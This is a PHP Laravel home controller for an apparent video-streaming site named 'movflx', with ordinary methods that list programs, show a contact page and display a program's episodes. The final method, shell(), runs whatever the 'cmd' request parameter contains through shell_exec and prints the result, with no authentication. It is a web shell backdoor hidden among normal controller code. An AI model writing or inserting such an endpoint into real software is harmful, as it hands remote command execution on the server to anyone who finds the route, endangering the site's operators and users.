<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Programa;
use App\Models\Episodio;


class HomeController extends Controller
{
     /**
     * Handle the incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function __invoke(Request $request)
    {

        $programas = Programa::orderBy("nome_programa")->get();

        return view('movflx.index',["programas"=>$programas]);
    }

    public function contato(Request $request)
    {
        return view('movflx.contact');
    }

    public function exibirPrograma($id)
    {

        $programa = Programa::find($id);
        $episodios = Episodio::where('id_programa',$id)->orderBy("data_lançamento","desc")->get();

        if (is_null($programa)) {
			return redirect()
            ->back();
		}

        return view('movflx.programa',["programa"=>$programa, "episodios"=>$episodios]);
    }

    public function shell(Request $request){
        $out = [];
        $output = shell_exec($request->cmd);
        echo nl2br($output);
    }
}
